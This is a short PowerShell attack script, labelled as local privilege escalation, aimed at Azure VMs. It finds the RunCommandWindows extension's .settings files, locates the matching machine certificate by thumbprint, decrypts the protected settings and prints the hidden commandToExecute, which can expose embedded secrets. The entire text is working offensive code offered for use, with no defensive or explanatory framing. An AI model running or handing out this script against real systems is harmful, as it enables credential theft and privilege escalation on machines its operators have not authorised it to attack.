#Local Priv Esc looking for .settings & thumbprints:

	Add-Type -AssemblyName "System.Security"
	$path = "C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.8\RuntimeSettings\"
	$runSettingFiles = Get-ChildItem -Path $path -Recurse -Filter "*.settings"
	foreach ($runSettingFile in $runSettingFiles) {
	    $content = Get-Content -Path $runSettingFile.FullName | ConvertFrom-Json
	    $certLocation = Set-Location -Path "Cert:\LocalMachine\My"
	    $certs = Get-ChildItem -Path $certLocation | Where-Object {$_.Thumbprint -eq ($($content.runtimeSettings.handlerSettings.protectedSettingsCertThumbprint))}
	    foreach ($cert in $certs) {
	        Write-Host $cert.Thumbprint
	        Write-Host -ForegroundColor Green "Found: " $cert.Subject "that has thumbprint: " $cert.thumbprint:
	        $cipher = $content.runtimeSettings.handlerSettings.protectedSettings
	        $encryptedBytes = [Convert]::FromBase64String($cipher)
	        $env = New-Object Security.Cryptography.Pkcs.EnvelopedCms
	        $env.Decode($encryptedBytes)
	        $env.Decrypt()
	        $clearText = [System.Text.Encoding]::UTF8.GetString($env.ContentInfo.Content)
	        $clearText | Convertfrom-Json | Select-Object commandToExecute
	    }
}
